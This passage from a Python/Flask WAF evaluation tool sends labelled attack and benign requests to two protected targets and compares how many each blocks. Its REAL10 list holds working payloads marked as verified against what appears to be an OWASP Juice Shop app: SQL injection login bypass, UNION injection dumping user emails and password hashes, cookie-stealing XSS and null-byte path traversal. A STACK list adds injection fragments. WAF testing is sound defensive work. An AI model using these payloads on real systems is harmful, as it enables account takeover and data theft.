    Pattern("benign","fm_like","GET","/index.php",{"page":"home.php","search":"sqlite like() case sensitivity"},note="sig 200002880 SQLite LIKE() Medium.",kind="sig_probe",risk="medium"),
    Pattern("benign","fm_nullif","GET","/index.php",{"page":"home.php","search":"nullif() and reverse() sql functions"},note="sig 200002439/200002441 Medium.",kind="sig_probe",risk="medium"),
]
REAL10 = [
    Pattern("attack","j_sqli_login","POST","/rest/user/login",json_body={"email":"' OR 1=1--","password":"x"},note="SQLi login bypass -> returns JWT, admin takeover (verified).",kind="sig_probe",risk="high"),
    Pattern("attack","j_sqli_login_like","POST","/rest/user/login",json_body={"email":"' OR 1 LIKE 1--","password":"x"},note="SQLi login bypass (LIKE variant) -> returns JWT (verified).",kind="sig_probe",risk="high"),
    Pattern("attack","j_sqli_dump","GET","/rest/products/search",{"q":"qwert')) UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--"},note="UNION SQLi dumps user emails+password hashes (verified).",kind="sig_probe",risk="high"),
    Pattern("attack","j_sqli_schema","GET","/rest/products/search",{"q":"qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9,10 FROM sqlite_master--"},note="UNION SQLi dumps DB schema (verified).",kind="sig_probe",risk="high"),
    Pattern("attack","j_sqli_like_bypass","GET","/rest/products/search",{"q":"qwert')) OR 1 LIKE 1--"},note="Boolean SQLi via LIKE (low-accuracy sig) -> forces all 56 rows (filter bypass, qwert alone=0); AI blocks, signature-only Basic MISSES (verified).",kind="sig_probe",risk="high"),
    Pattern("attack","j_sqli_or","GET","/rest/products/search",{"q":"qwert')) OR 1=1--"},note="Boolean SQLi returns all rows (verified).",kind="sig_probe",risk="high"),
    Pattern("attack","j_xss_iframe","GET","/rest/products/search",{"q":"<iframe src=\"javascript:alert(`xss`)\">"},note="DOM XSS via search (reflected client-side).",kind="sig_probe",risk="high"),
    Pattern("attack","j_xss_img","GET","/rest/products/search",{"q":"<img src=x onerror=alert(document.cookie)>"},note="XSS img onerror via search.",kind="sig_probe",risk="high"),
    Pattern("attack","j_trav_pkg","GET","/ftp/package.json.bak%2500.md",note="Path traversal null-byte -> reads package.json.bak (verified 200).",kind="sig_probe",risk="high"),
    Pattern("attack","j_trav_coupons","GET","/ftp/coupons_2013.md.bak%2500.md",note="Path traversal null-byte -> reads coupons file (verified 200).",kind="sig_probe",risk="high"),
]
FAKE10 = [

    Pattern("benign","ben_console_log","GET","/rest/products/search",{"q":"console.log() prints to the browser console"},note="console.log Medium XSS sig; Basic FP, AI allows.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_console_error","GET","/rest/products/search",{"q":"console.error() logs an error message"},note="console.error Medium XSS sig; Basic FP, AI allows.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_console_warn","GET","/rest/products/search",{"q":"what is console.warn() used for"},note="console.warn Medium XSS sig; Basic FP, AI allows.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_console_debug","GET","/rest/products/search",{"q":"console.debug() verbose logging tutorial"},note="console.debug Medium XSS sig; Basic FP, AI allows.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_console_info","GET","/rest/products/search",{"q":"console.info vs console.log difference"},note="console.info Medium XSS sig; Basic FP, AI allows.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_apple","GET","/rest/products/search",{"q":"apple"},note="clean product search.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_honey","GET","/rest/products/search",{"q":"juice"},note="clean product search.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_banana","GET","/rest/products/search",{"q":"banana"},note="clean product search.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_tea","GET","/rest/products/search",{"q":"melon"},note="clean product search.",kind="sig_probe",risk="low"),
    Pattern("benign","ben_soap","GET","/rest/products/search",{"q":"smoothie"},note="clean product search.",kind="sig_probe",risk="low"),
]

REAL5 = [REAL10[0], REAL10[2], REAL10[4], REAL10[7], REAL10[8]]

FAKE5 = [FAKE10[0], FAKE10[1], FAKE10[2], FAKE10[5], FAKE10[6]]
STACK = [

    Pattern("attack","stack_all8","GET","/rest/products/search",
            {"q":"VERSION()","a":"x' OR 'y","b":"$where: 1","c":"<marquee>","d":"&#x41;","e":"$IFS","f":";more config","g":"echo(123)"},
            note="8 Low/Low sigs stacked: 200102154,200102092,200002956,200101872,200001174,200003995,200003088,200104921.",
            kind="sig_probe",risk="low"),
    Pattern("attack","stack_sql4","GET","/rest/products/search",
            {"q":"VERSION()","a":"x' OR 'y","b":"$where: 1","c":"a' = 'b"},
            note="4 Low/Low SQL sigs stacked: 200102154,200102092,200002956,200102091.",
            kind="sig_probe",risk="low"),
    Pattern("attack","stack_mixcat","GET","/rest/products/search",
            {"q":"<marquee>","a":"&#x41;","b":"$IFS","c":";more config","d":"echo(123)"},
            note="5 Low/Low XSS+Cmd+SSCI sigs stacked: 200101872,200001174,200003995,200003088,200104921.",
            kind="sig_probe",risk="low"),
]
ALL = {
    "normal": NORMAL,
    "attack": ATTACK,
    "medium": MEDIUM,
    "sweep": SWEEP,
    "sweep2": SWEEP2,
    "sweep3": SWEEP3,
    "sweep4": SWEEP4,
    "allsig": ALLSIG,
    "high": HIGH,
    "juice": JUICE,
    "high20": HIGH20,
    "medium20": MEDIUM20,
    "evade": EVADE,
    "frontier": FRONTIER,
    "lowacc": LOWACC,
    "combo": COMBO,
    "lowsig": LOWSIG,
    "nlsql": NLSQL,
    "mix": MIX,
    "lowlow": LOWLOW,
    "stack": STACK,
    "benign_bulk": BENIGN_BULK,
    "muti": MUTI,
    "muti_benign": MUTI_BENIGN,
    "stealth": STEALTH,
    "fp_demo": FP_DEMO,
    "fake_med": FAKE_MED,
    "real10": REAL10,
    "fake10": FAKE10,
    "real5": REAL5,
    "fake5": FAKE5,
    "benign": BENIGN_REPORTS,
    "diagnostic": SIGNATURE_REPORTS,
}
SCENARIOS = {

    "demo": ["real5", "fake5"],
}


def build_url(base, p):
    url = base.rstrip("/") + p.path
    if p.params:

        url += "?" + urllib.parse.urlencode(p.params, quote_via=urllib.parse.quote)
    return url


CHROME_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


WAF_SIGNS = ("Request Rejected", "support ID is", "The requested URL was rejected")
SUPPORT_ID_RE = re.compile(r"support ID is:\s*([A-Za-z0-9-]+)", re.IGNORECASE)


def classify_response(status, headers, body):
    if status is None:
        return "network_error"
    normalized = {str(k).lower(): str(v) for k, v in (headers or {}).items()}
    server = normalized.get("server", "").lower()
    if "volt-adc" in server or (body and any(s.lower() in body.lower() for s in WAF_SIGNS)):
        return "waf_blocked"
    if status >= 400:
        return "application_error"
    return "passed"


def is_blocked(status, body, headers=None):
    return classify_response(status, headers or {}, body) == "waf_blocked"


def send(session, base, p, timeout):
    url = build_url(base, p)
    headers = dict(p.headers or {})

    body = p.json_body
    if body and any("{rand}" in str(v) for v in body.values()):
        tok = str(int(time.time() * 1000))
        body = {k: (v.replace("{rand}", tok) if isinstance(v, str) else v) for k, v in body.items()}
    t0 = time.time()
    preflight = None
    try:
        if p.requires_captcha:
            captcha_url = base.rstrip("/") + "/rest/captcha"
            captcha_response = session.get(captcha_url, timeout=timeout, allow_redirects=False)
            preflight = {"url": captcha_url, "status": captcha_response.status_code}
            if captcha_response.status_code >= 400:
                raise RuntimeError(f"Captcha request failed: HTTP {captcha_response.status_code}")
            captcha_data = captcha_response.json()
            body = {**(body or {}), "captchaId": captcha_data["captchaId"],
                    "captcha": captcha_data["answer"]}

        if p.method == "GET":
            r = session.get(url, headers=headers, timeout=timeout, allow_redirects=False)
        elif p.form_body is not None:
            r = session.request(p.method, url, data=p.form_body, headers=headers, timeout=timeout,
                                 allow_redirects=False)
        else:
            r = session.request(p.method, url, json=body, headers=headers, timeout=timeout,
                                 allow_redirects=False)
        sent_body = r.request.body
        if isinstance(sent_body, bytes):
            sent_body = sent_body.decode("utf-8", "replace")
        return {"status": r.status_code, "ms": round((time.time() - t0) * 1000), "error": None,
                "req_headers": dict(r.request.headers), "resp_headers": dict(r.headers),
                "resp_body": r.text[:20000],
                "sent_url": r.url, "sent_body": sent_body, "preflight": preflight}
    except Exception as e:
        return {"status": None, "ms": round((time.time() - t0) * 1000), "error": str(e),
                "req_headers": headers, "resp_headers": {}, "resp_body": "",
                "sent_url": build_url(base, p), "sent_body": None, "preflight": preflight}


def record(p, base, result):
    outcome = classify_response(result["status"], result.get("resp_headers", {}),
                                result.get("resp_body", ""))
    match = SUPPORT_ID_RE.search(result.get("resp_body", ""))
    response_headers = {str(k).lower(): v for k, v in result.get("resp_headers", {}).items()}
    return {
        "ts": datetime.now(timezone.utc).isoformat(),
        "label": p.label,
        "kind": p.kind,
        "expected_risk": p.risk,
        "name": p.name,
        "method": p.method,
        "url": build_url(base, p),
        "status": result["status"],
        "latency_ms": result["ms"],
        "error": result["error"],
        "note": p.note,
        "blocked": outcome == "waf_blocked",
        "outcome": outcome,
        "support_id": match.group(1) if match else None,
        "ai_risk_evidence": "not_in_http_response",
        "request": {
            "method": p.method,
            "url": build_url(base, p),
            "sent_url": result.get("sent_url"),
            "sent_body": result.get("sent_body"),
            "headers": result.get("req_headers", {}),
            "body": p.json_body,
            "preflight": result.get("preflight"),
        },
        "response": {
            "status": result["status"],
            "headers": result.get("resp_headers", {}),
            "body": result.get("resp_body", ""),
            "source": outcome,
            "support_id": match.group(1) if match else None,
            "f5_request_id": response_headers.get("x-f5-request-id"),
            "ai_risk_level": None,
            "ai_classification": None,
        },
    }


def main():
    ap = argparse.ArgumentParser(description="Labeled traffic client for F5 AI Risk Scoring")
    ap.add_argument("--base", default="http://ai-risk.nginxstore.co.kr", help="F5 protected app URL")
    ap.add_argument("--scenario", choices=SCENARIOS, default="demo",
                    help="demo, attacks, normal, benign_reports, or signature_reports (default: demo)")
    ap.add_argument("--rounds", type=int, default=1, help="how many times to run the chosen set")
    ap.add_argument("--only", choices=["normal", "attack", "benign"],
                    help="send only this class; overrides --scenario")
    ap.add_argument("--mix", action="store_true", help="shuffle order within each round")
    ap.add_argument("--delay", type=float, default=0.3, help="seconds between requests")
    ap.add_argument("--timeout", type=float, default=10.0, help="per-request timeout")
    ap.add_argument("--jsonl", help="write labeled results to this JSONL file")
    ap.add_argument("--dry-run", action="store_true", help="print requests, send nothing")
    args = ap.parse_args()

    classes = [args.only] if args.only else SCENARIOS[args.scenario]
    patterns = [p for c in classes for p in ALL[c]]

    if not args.dry_run and requests is None:
        print("ERROR: the 'requests' package is required. Install: pip install requests", file=sys.stderr)
        sys.exit(1)

    session = None if args.dry_run else requests.Session()
    session and session.headers.update({"User-Agent": CHROME_UA})

    counts = {"normal": 0, "attack": 0, "benign": 0}
    blocked = {"normal": 0, "attack": 0, "benign": 0}
    out = open(args.jsonl, "w") if args.jsonl else None

    print(f"target={args.base}  classes={classes}  rounds={args.rounds}  "
          f"{'DRY-RUN' if args.dry_run else 'LIVE'}")
    print("-" * 78)

    for rnd in range(1, args.rounds + 1):
        order = list(patterns)
        if args.mix:
            random.shuffle(order)
        for p in order:
            counts[p.label] += 1
            if args.dry_run:
                print(f"[{p.label:6}] {p.method:4} {build_url(args.base, p)}")
                continue
            res = send(session, args.base, p, args.timeout)
            row = record(p, args.base, res)
            flag = ""
            if row["blocked"]:
                blocked[p.label] += 1
                flag = "  <-- blocked"
            print(f"r{rnd} [{p.label:6}] {p.method:4} {res['status']} "
                  f"{res['ms']:>4}ms  {p.name}{flag}")
            support = f" support={row['support_id']}" if row["support_id"] else ""
            print(f"         outcome={row['outcome']}{support}; AI risk/classification: check F5 event")
            if out:
                out.write(json.dumps(row) + "\n")
            time.sleep(args.delay)

    print("-" * 78)
    print("sent:", dict(counts))
    if not args.dry_run:
        print("confirmed F5 WAF blocks:", dict(blocked))
        tp = blocked["attack"]
        fn = counts["attack"] - blocked["attack"]
        fp = blocked["normal"] + blocked["benign"]
        tn = counts["normal"] + counts["benign"] - fp
        print(f"attack/normal view -> attack blocked={tp} not-WAF-blocked={fn}; "
              f"benign blocked={fp} not-WAF-blocked={tn}")
        print("normal controls:", counts["normal"], "benign bug reports:", counts["benign"])
        print("Natural bug reports are included in FP/TN; use --scenario signature_reports "
              "to compare the current blocked baseline.")
    if out:
        out.close()
        print(f"labeled results written to {args.jsonl}")


app = Flask(__name__)
DEFAULT_TARGET = "http://ai-risk.nginxstore.co.kr"

PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>F5 AI Risk Scoring Demo</title>
<style>
  :root{--bg:#0d1117;--panel:#161b22;--line:#30363d;--fg:#e6edf3;--muted:#8b949e;
    --normal:#3fb950;--attack:#f85149;--decoy:#d29922;--accent:#58a6ff}
  *{box-sizing:border-box}
  body{margin:0;font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;background:var(--bg);color:var(--fg)}
  header{padding:16px 24px;border-bottom:1px solid var(--line);display:flex;align-items:baseline;gap:12px}
  header h1{font-size:16px;margin:0}.subtitle{color:var(--muted);font-size:12px}
  .layout{display:grid;grid-template-columns:300px 1fr;height:calc(100vh - 57px)}
  aside{padding:20px;border-right:1px solid var(--line);overflow:auto}
  main{padding:20px;overflow:auto;min-width:0}
  .label{display:block;margin:14px 0 4px;color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.04em}
  input{width:100%;padding:8px;background:var(--bg);color:var(--fg);border:1px solid var(--line);border-radius:6px;font:inherit}
  input:focus,textarea:focus{outline:1px solid var(--accent)}
  .button-list{display:flex;flex-direction:column;gap:6px;margin-top:6px}
  button{width:100%;margin-top:10px;padding:10px;border:0;border-radius:6px;background:var(--accent);color:#06121f;font:inherit;font-weight:700;cursor:pointer}
  button.primary{background:var(--accent);color:#06121f}
  button:not(.primary)[data-scenario]{background:var(--panel);border:1px solid var(--line);color:var(--fg);text-align:left}
  button:disabled{opacity:.5;cursor:default}
  .button-note{display:block;color:var(--muted);font-size:11px;font-weight:400;margin-top:2px}
  .field-row{display:grid;grid-template-columns:1fr 86px;gap:8px}
  .note{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:10px;color:var(--muted);font-size:12px;line-height:1.6}
  .note strong{color:var(--fg)}.note.ai{margin-top:16px}.note.warn{margin-top:8px;color:#d29922}
  .notes{margin-bottom:14px}
  .cards{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:18px}
  .card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px}
  .card .n{font-size:24px;font-weight:700}.card .l{color:var(--muted);font-size:11px;text-transform:uppercase}
  .card .n .split{display:inline-block;margin-right:14px;font-size:22px}
  .card .n .split i{display:block;font-size:10px;font-weight:400;font-style:normal;opacity:.7;text-transform:uppercase}
  .card.tp{border-color:var(--normal)}.card.fn{border-color:var(--attack)}
  .card.fp{border-color:var(--decoy)}.card.tn{border-color:var(--line)}
  .verdict{margin:0 0 16px;padding:12px 16px;border-radius:8px;background:var(--panel);border:1px solid var(--accent);font-size:13px;line-height:1.6}
  .verdict b{color:var(--fg)} .verdict .up{color:var(--normal);font-weight:700} .verdict .dn{color:var(--attack);font-weight:700}
  .scoreboard{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:18px}
  .wafcard{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px}
  .wafcard.ai{border:2px solid var(--accent)} .wafcard.basic{border:2px solid var(--decoy)}
  .wafcard h3{margin:0 0 12px;font-size:15px;display:flex;align-items:center;gap:8px}
  .wafcard .badge{font-size:10px;padding:2px 8px;border-radius:999px;font-weight:700}
  .wafcard.ai .badge{background:rgba(88,166,255,.18);color:var(--accent)}
  .wafcard.basic .badge{background:rgba(210,153,34,.18);color:var(--decoy)}
  .headline{display:flex;gap:16px;margin-bottom:14px}
  .headline .big{flex:1;background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:10px 12px}
  .headline .big .v{font-size:32px;font-weight:800;line-height:1}
  .headline .big .k{font-size:10px;color:var(--muted);text-transform:uppercase;margin-top:4px;letter-spacing:.03em}
  .v.good{color:var(--normal)} .v.bad{color:var(--attack)}
  .quad{display:grid;grid-template-columns:1fr 1fr;gap:8px}
  .quad > div{border:1px solid var(--line);border-radius:6px;padding:8px 10px;font-size:10px;color:var(--muted);text-transform:uppercase}
  .quad b{font-size:20px;display:block;margin-bottom:1px}
  .quad .tp b,.quad .tn b{color:var(--normal)} .quad .fn b,.quad .fp b{color:var(--attack)}
  .toolbar{display:flex;justify-content:space-between;align-items:center;margin:18px 0 8px;gap:12px}
  .toolbar h2{font-size:14px;margin:0}.toolbar button{width:auto;margin:0;padding:8px 10px}
  .status{color:var(--muted);font-size:12px;margin-top:3px}
  .table-wrap{overflow:auto}
  table{width:100%;border-collapse:collapse;font-size:12.5px}
  th,td{text-align:left;padding:6px 8px;border-bottom:1px solid var(--line);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:380px}
  th{color:var(--muted);font-weight:600;position:sticky;top:0;background:var(--bg)}
  tr.result{cursor:pointer}tr.result:hover td{background:var(--panel)}tr.detail td{background:#0a0d12;max-width:none;white-space:normal}
  pre{margin:0;padding:10px;font-size:12px;line-height:1.5;color:var(--fg);white-space:pre-wrap;word-break:break-all;max-height:360px;overflow:auto}
  .tag{display:inline-block;padding:1px 7px;border-radius:999px;font-size:11px;font-weight:700}
  .tag.normal{background:rgba(63,185,80,.15);color:var(--normal)}
  .tag.attack{background:rgba(248,81,73,.15);color:var(--attack)}
  .tag.benign{background:rgba(210,153,34,.15);color:var(--decoy)}
  .tag.signature_report{background:rgba(248,81,73,.12);color:var(--decoy)}
  .outcome.waf_blocked{color:var(--attack);font-weight:700}.outcome.passed{color:var(--normal)}
  .outcome.application_error{color:var(--decoy)}.outcome.network_error{color:var(--muted)}
  .empty{color:var(--muted);padding:40px;text-align:center}
  .legend,.footer{color:var(--muted);font-size:11px;line-height:1.7;margin-top:10px}
  .event-import{margin:16px 0;border:1px solid var(--line);border-radius:6px;background:var(--panel);padding:10px}
  .event-import summary{cursor:pointer;font-size:12px;color:var(--fg)}
  .event-import p{color:var(--muted);font-size:11px}
  .event-import textarea{width:100%;min-height:90px;background:var(--bg);color:var(--fg);border:1px solid var(--line);border-radius:6px;padding:8px;font:11px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
  .event-import input[type=file]{font-size:11px;color:var(--muted);margin:7px 0}
  .event-import button{width:auto;margin:8px 8px 0 0;padding:8px 10px}
  .event-status{font-size:11px;color:var(--muted)}
  @media(max-width:900px){.layout{grid-template-columns:260px 1fr}.cards{grid-template-columns:repeat(2,1fr)}}
  @media(max-width:680px){.layout{display:block;height:auto;min-height:calc(100vh - 57px)}aside{border-right:0;border-bottom:1px solid var(--line)}main{padding:14px}}
</style>
</head>
<body>
<header>
  <h1>F5 AI Risk Scoring Demo</h1>
</header>
<div class="layout">
<aside>
  <label class="label" for="base">Target A — AI-Powered WAF</label>
  <input id="base" type="url" value="http://ai-risk.nginxstore.co.kr" spellcheck="false">
  <label class="label" for="base2">Target B — Basic WAF (signature only) — blank for single target</label>
  <input id="base2" type="url" value="http://ai-defense.nginxstore.co.kr" spellcheck="false">
  <label class="label">Run a scenario</label>
  <div class="button-list">
    <button class="primary" data-scenario="demo">▶ Run demo (20 requests)<span class="button-note">10 real attacks (verified SQLi dump / RCE / LFI / XSS / SSCI) + 10 benign requests that look like attacks — run on both LBs to compare AI vs Basic</span></button>
  </div>
</aside>
<main>
  <div id="verdict" class="verdict" style="display:none"></div>
  <div id="scoreboard" class="scoreboard"><div class="empty" style="grid-column:1/-1">Run the demo to compare AI-Powered WAF vs Basic WAF.</div></div>
  <div class="toolbar"><div><h2>Request results</h2><div id="run-status" class="status">No requests sent yet.</div></div><button id="download" disabled>Download JSONL</button></div>
  <div class="table-wrap"><table>
    <thead><tr><th>#</th><th>Target</th><th>Class</th><th>Method</th><th>Result</th><th>Time</th><th>Test</th><th>Request URL</th></tr></thead>
    <tbody id="rows"><tr><td colspan="8" class="empty">Choose a scenario to begin.</td></tr></tbody>
  </table></div>
  <div class="footer">Click a row to inspect the exact request, response, F5 support ID, and AI evidence status.</div>
</main>
</div>
<script>
const $ = id => document.getElementById(id);
let latestRows = [];
const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const decode = u => { try { return decodeURIComponent(u); } catch(e) { return u; } };
function detail(r){
  const q=r.request||{}, p=r.response||{};
  const body=q.sent_body!=null ? q.sent_body : (q.body!=null ? JSON.stringify(q.body,null,2) : '');
  const headers=Object.entries(q.headers||{}).map(([k,v])=>k+': '+v).join('\n');
  const responseHeaders=Object.entries(p.headers||{}).map(([k,v])=>k+': '+v).join('\n');
  const preflight=q.preflight?'CAPTCHA GET '+q.preflight.url+' ['+q.preflight.status+']\n\n':'';
  const events=r.f5_events||[];
  const eventText=events.length ? events.map((e,n)=>'Event '+(n+1)+' · '+e.match_quality+
    '\nTime: '+(e.timestamp||'unknown')+' · '+(e.method||'')+' '+(e.path||'')+
    '\nreq_id: '+(e.req_id||'not present')+' · action: '+(e.action||'unknown')+
    ' · req_risk: '+(e.req_risk||'unknown')+
    '\nreq_risk_reasons: '+JSON.stringify(e.req_risk_reasons||[])+
    '\nSignatures: '+(e.signatures||[]).map(s=>[s.id,s.name,s.risk,s.accuracy].filter(Boolean).join(' / ')).join('; ')
  ).join('\n\n') : (r.f5_events ? 'No matching F5 event in the imported export. This does not prove that no AI evaluation occurred.' : 'No F5 event export attached.');
  return 'TEST: '+(r.note||'')+'\nSent at: '+(r.ts||'unknown')+'\n\n'+preflight+'REQUEST\n'+q.method+' '+decode(q.sent_url||q.url)+'\n'+headers+(body?'\n\n'+body:'')+
    '\n\nRESPONSE ['+(p.status==null?'—':p.status)+'] · '+(r.outcome||'unknown')+'\n'+responseHeaders+
    '\n\nF5 support ID: '+(r.support_id||'not present')+
    '\nAI risk level: unavailable in HTTP response; inspect the matching F5 security event.'+
    '\n\nIMPORTED F5 EVENT EVIDENCE\n'+eventText+
    (r.error?'\n\nCLIENT ERROR: '+r.error:'')+'\n\n'+(p.body||'');
}
function rowStatus(r){
  if(r.outcome==='waf_blocked') return 'F5 WAF blocked';
  if(r.outcome==='application_error') return 'Application response';
  if(r.outcome==='network_error') return 'Network error';
  return 'Passed';
}
function targetLabel(t){return /ai-risk/.test(t)?'AI':(/ai-defense/.test(t)?'Basic':(()=>{try{return new URL(t).host;}catch(e){return t;}})());}
function wafMeta(t){
  if(/ai-risk/.test(t)) return ['AI-Powered WAF','ai','AI'];
  if(/ai-defense/.test(t)) return ['Basic WAF','basic','SIGNATURE'];
  let h=t; try{h=new URL(t).host;}catch(e){}
  return [h||'WAF','basic','WAF'];
}
function metrics(rs){
  const blk=g=>g.filter(r=>r.outcome==='waf_blocked').length;
  const a=rs.filter(r=>r.label==='attack'), u=rs.filter(r=>r.label==='normal'||r.label==='benign');
  return {tp:blk(a),fn:a.length-blk(a),fp:blk(u),tn:u.length-blk(u),atk:a.length,ben:u.length};
}
function wafPanel(t,m){
  const [name,cls,badge]=wafMeta(t);
  return '<div class="wafcard '+cls+'"><h3>'+esc(name)+'<span class="badge">'+badge+'</span></h3>'+
    '<div class="headline">'+
      '<div class="big"><div class="v '+(m.tp===m.atk?'good':'bad')+'">'+m.tp+'/'+m.atk+'</div><div class="k">attacks blocked</div></div>'+
      '<div class="big"><div class="v '+(m.fp===0?'good':'bad')+'">'+m.fp+'/'+m.ben+'</div><div class="k">false blocks</div></div>'+
    '</div>'+
    '<div class="quad">'+
      '<div class="tp"><b>'+m.tp+'</b>Attacks blocked ✅</div>'+
      '<div class="fn"><b>'+m.fn+'</b>Attacks let through ❌</div>'+
      '<div class="fp"><b>'+m.fp+'</b>Safe requests blocked ❌</div>'+
      '<div class="tn"><b>'+m.tn+'</b>Safe requests allowed ✅</div>'+
    '</div></div>';
}
function refreshCounts(rows){
  const targets=[...new Set(rows.map(r=>r.target).filter(Boolean))];
  const sb=$('scoreboard'); const vd=$('verdict');
  if(!rows.length){sb.innerHTML='<div class="empty" style="grid-column:1/-1">Run the demo to compare.</div>';vd.style.display='none';return;}
  const list = targets.length ? targets : [''];
  sb.innerHTML = list.map(t=>wafPanel(t, metrics(t?rows.filter(r=>r.target===t):rows))).join('');
  const ai=targets.find(t=>/ai-risk/.test(t)), bs=targets.find(t=>/ai-defense/.test(t));
  if(ai&&bs){
    const ma=metrics(rows.filter(r=>r.target===ai)), mb=metrics(rows.filter(r=>r.target===bs));
    const moreAtk=ma.tp-mb.tp, fewerFp=mb.fp-ma.fp;
    vd.style.display='block';
    vd.innerHTML='<b>AI-Powered WAF</b>: '+ma.tp+'/'+ma.atk+' attacks blocked, '+ma.fp+' false blocks &nbsp;·&nbsp; '+
      '<b>Basic WAF</b>: '+mb.tp+'/'+mb.atk+' attacks blocked, '+mb.fp+' false blocks<br>'+
      'AI caught <span class="'+(moreAtk>0?'up':'dn')+'">'+(moreAtk>=0?'+':'')+moreAtk+'</span> attack(s) that Basic missed and raised <span class="'+(fewerFp>0?'up':'dn')+'">'+fewerFp+'</span> fewer false positive(s).';
  } else vd.style.display='none';
}
function renderRows(){
  refreshCounts(latestRows); $('download').disabled=!latestRows.length;
  $('rows').innerHTML=latestRows.map((r,i)=>{
    const cls=r.outcome||'network_error';
    const tag=r.kind==='signature_report'?'blocked report':
      r.label==='benign'?'benign report':r.label;
    const tagClass=r.kind==='signature_report'?'signature_report':r.label;
    const host=(()=>{try{return new URL(r.target||r.url).host;}catch(e){return r.target||'';}})();
    return '<tr class="result" data-row="'+i+'"><td>'+(i+1)+'</td><td title="'+esc(r.target||'')+'">'+esc(host)+'</td><td><span class="tag '+esc(tagClass)+'">'+esc(tag)+'</span></td>'+
      '<td>'+esc(r.method)+'</td>'+
      '<td class="outcome '+esc(cls)+'">'+esc(rowStatus(r))+' · '+(r.status==null?'—':r.status)+'</td>'+
      '<td>'+esc(r.latency_ms)+' ms</td><td>'+esc(r.name)+'</td><td title="'+esc(r.url)+'">'+esc(decode(r.url))+'</td></tr>'+
      '<tr class="detail" id="detail-'+i+'" style="display:none"><td colspan="8"><pre>'+esc(detail(r))+'</pre></td></tr>';
  }).join('')||'<tr><td colspan="8" class="empty">No results.</td></tr>';
  document.querySelectorAll('tr.result').forEach(row=>row.addEventListener('click',()=>{
    const detailRow=$('detail-'+row.dataset.row); detailRow.style.display=detailRow.style.display==='none'?'table-row':'none';
  }));
}
async function runScenario(scenario,button){
  const buttons=[...document.querySelectorAll('button[data-scenario]')];
  buttons.forEach(b=>b.disabled=true); const old=button.innerHTML; button.innerHTML='Sending…';
  const t2=$('base2').value.trim();
  $('run-status').textContent='Sending '+scenario+' to '+$('base').value+(t2?' and '+t2:'');
  $('rows').innerHTML='<tr><td colspan="8" class="empty">Requests in progress…</td></tr>';
  try{
    const response=await fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({base:$('base').value,base2:t2,scenario:scenario})});
    const data=await response.json(); if(!response.ok||data.error) throw new Error(data.error||response.statusText);
    latestRows=data.rows||[]; renderRows();
    const per=(data.targets||[]).map(t=>{const g=latestRows.filter(r=>r.target===t);const b=g.filter(r=>r.outcome==='waf_blocked').length;let h='';try{h=new URL(t).host;}catch(e){h=t;}const kind=/ai-risk/.test(t)?' (AI)':(/ai-defense/.test(t)?' (Basic)':'');return h+kind+': '+b+'/'+g.length+' blocked';}).join('  ·  ');
    $('run-status').textContent=latestRows.length+' requests · '+per+' · '+new Date().toLocaleTimeString();
  }catch(error){
    $('run-status').textContent='Run failed'; $('rows').innerHTML='<tr><td colspan="8" class="empty">'+esc(error.message)+'</td></tr>';
  }finally{buttons.forEach(b=>b.disabled=false);button.innerHTML=old;}
}
document.querySelectorAll('button[data-scenario]').forEach(button=>button.addEventListener('click',()=>runScenario(button.dataset.scenario,button)));
$('download').addEventListener('click',()=>{
  const blob=new Blob([latestRows.map(row=>JSON.stringify(row)).join('\n')+'\n'],{type:'application/x-ndjson'});
  const link=document.createElement('a'); link.href=URL.createObjectURL(blob); link.download='ai-risk-demo-'+new Date().toISOString().replace(/[:.]/g,'-')+'.jsonl'; link.click(); URL.revokeObjectURL(link.href);
});
</script>
</body>
</html>"""


@app.get("/")
def index():
    response = Response(PAGE, mimetype="text/html")
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    response.headers["Pragma"] = "no-cache"
    return response


@app.get("/api/health")
def health():
    return jsonify({"status": "ok", "default_target": DEFAULT_TARGET})


def _json_cell(value):
    if not isinstance(value, str):
        return value
    value = value.strip()
    if not value:
        return None
    try:
        return json.loads(value)
    except json.JSONDecodeError:
        return value


def _parse_event_export(text):
    text = text.lstrip("\ufeff").strip()
    if not text:
        raise ValueError("Choose a file or paste an F5 event export.")
    if len(text.encode("utf-8")) > 5 * 1024 * 1024:
        raise ValueError("Event export exceeds the 5 MB limit.")

    data = None
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        lines = [line for line in text.splitlines() if line.strip()]
        parsed_lines = []
        for line in lines:
            try:
                parsed_lines.append(json.loads(line))
            except json.JSONDecodeError:
                parsed_lines = []
                break
        if parsed_lines:
            data = parsed_lines

    if data is not None:
        if isinstance(data, dict):
            data = data.get("events", data.get("items", [data]))
        if not isinstance(data, list):
            raise ValueError("JSON export must contain an event object or event list.")
        events = []
        for item in data:
            if isinstance(item, str):
                item = _json_cell(item)
            if isinstance(item, dict):
                events.append(item)
        if len(events) > 5000:
            raise ValueError("Event export contains more than 5,000 records.")
        return events

    first_line = text.splitlines()[0]
